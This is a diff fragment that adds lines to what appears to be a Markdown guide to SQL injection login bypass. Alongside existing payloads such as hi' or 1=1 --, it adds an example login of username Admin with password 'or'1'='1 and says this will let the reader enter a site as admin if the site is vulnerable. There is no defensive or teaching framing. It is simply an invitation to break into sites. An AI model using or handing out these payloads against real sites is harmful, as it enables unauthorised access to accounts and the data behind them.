@@ -85,6 +85,13 @@ hi' or 1=1 --
 ```bash
 'or'1=1'
 ```
+## So your input should look like this
+```bash
+username:Admin
+password:'or'1'='1
+```
+## that will confuse the site and give you authorisation to enter as admin
+## If the site is vulnerable than you are in Big Grin
 
 
 
